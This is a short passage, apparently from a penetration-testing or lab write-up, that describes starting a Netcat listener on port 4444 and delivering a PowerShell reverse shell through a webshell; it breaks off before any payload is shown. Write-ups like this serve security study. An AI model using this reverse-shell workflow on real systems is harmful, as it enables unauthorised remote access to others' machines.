...
Before triggering the reverse shell, a Netcat listener was started locally to catch the incoming connection: `nc -lvnp 4444` A PowerShell reverse shell payload is delivered via the webshell:  
